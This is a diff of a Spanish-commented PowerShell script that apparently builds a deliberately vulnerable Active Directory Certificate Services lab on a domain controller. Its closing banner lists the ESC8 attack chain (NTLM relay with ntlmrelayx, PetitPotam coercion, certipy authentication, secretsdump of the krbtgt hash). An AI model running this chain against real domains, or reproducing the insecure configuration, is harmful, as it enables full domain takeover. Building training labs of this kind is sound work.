@@ -1,4 +1,4 @@
-﻿#Requires -RunAsAdministrator
+#Requires -RunAsAdministrator
 <#
 .SYNOPSIS
     dc01 - instala ADCS con Web Enrollment y lo deja en la configuracion que
@@ -30,7 +30,7 @@ $ErrorActionPreference = 'Stop'
 $lib = Join-Path $PSScriptRoot '..\config\lab.ps1'
 if (-not (Test-Path -LiteralPath $lib)) {
     throw ('No se encontro config\lab.ps1. Copia la carpeta config\ junto a windows\ ' +
-           'en la VM (ver buildsheets/windows-vms.md).')
+           'en la VM (ver GUIDE.md).')
 }
 . $lib
 $cfg = Import-BifrostLabConfig -Root $PSScriptRoot
@@ -167,13 +167,13 @@ Write-Host @"
    Autenticacion  : NTLM, sin TLS
    Plantilla      : DomainController (permite inscribir a DC01$)
 
- Cadena (desde kali, como $SvcUser):
+ Cadena (desde el HOST atacante, como $SvcUser):
    1. ntlmrelayx.py -t http://$DcIp/certsrv/certfnsh.asp \
          -smb2support --adcs --template DomainController
    2. PetitPotam.py -u $SvcUser -p '<password>' -d $DomainName \
          <LHOST> $DcIp
    3. certipy auth -pfx dc01.pfx -dc-ip $DcIp
    4. secretsdump.py -just-dc-user krbtgt <dominio>/DC01\$@$DcIp -hashes ...
-   (detalle: exploits/esc8/README.md)
+   (detalle: GUIDE.md, puente 4)
 ============================================================================
 "@ -ForegroundColor Green
